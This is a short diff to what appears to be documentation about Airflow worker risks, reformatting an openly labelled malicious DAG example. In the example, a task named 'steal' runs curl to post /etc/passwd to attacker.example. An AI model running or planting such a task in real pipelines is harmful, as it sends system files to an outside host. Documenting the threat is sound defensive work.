@@ -10,8 +10,9 @@ Airflow worker. Example:
 ```python
 def malicious():
     import subprocess, os
-    subprocess.run(["curl", "http://attacker.example/exfil",
-                    "-d", open("/etc/passwd").read()])
+
+    subprocess.run(["curl", "http://attacker.example/exfil", "-d", open("/etc/passwd").read()])
+
 
 with DAG("exfil") as dag:
     PythonOperator(task_id="steal", python_callable=malicious)
